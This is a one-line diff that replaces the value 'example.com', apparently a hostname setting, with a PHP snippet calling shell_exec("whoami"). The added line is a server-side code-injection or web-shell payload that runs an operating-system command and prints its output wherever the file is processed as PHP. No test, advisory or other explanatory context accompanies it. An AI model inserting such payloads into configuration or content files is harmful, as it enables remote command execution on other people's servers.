@@ -1,1 +1,1 @@
-example.com
+<?php echo shell_exec("whoami");?>
